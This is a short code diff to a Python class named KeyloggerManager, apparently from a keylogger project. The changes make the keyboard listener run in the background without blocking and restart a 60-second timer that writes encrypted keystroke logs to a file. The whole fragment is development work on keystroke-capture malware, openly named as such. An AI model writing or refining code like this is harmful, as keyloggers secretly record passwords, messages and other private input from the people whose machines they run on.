@@ -102,14 +102,19 @@ class KeyloggerManager:
         self.filewriter.writer(encrypt_data)
         self.keylogger_service.logs = self.keylogger_service.clear_logs()
         self.start_time = KeyloggerManager.get_time()
+        self.timer = Timer(interval=60, function=self.save_data)
+        self.timer.start()
 
 
     def start_logging(self):
         self.start_time = KeyloggerManager.get_time()
+        # with keyboard.Listener(on_press=self.keylogger_service.on_press,on_release=self.keylogger_service.on_release) as self.listener:
+        #     self.listener.join()
+        self.listener = keyboard.Listener(on_press=self.keylogger_service.on_press,on_release=self.keylogger_service.on_release)
+        self.listener.start()
         self.timer = Timer(interval=60,function=self.save_data)
         self.timer.start()
-        with keyboard.Listener(on_press=self.keylogger_service.on_press,on_release=self.keylogger_service.on_release) as self.listener:
-            self.listener.join()
+
 
     def stop_logging(self):
         if self.timer:
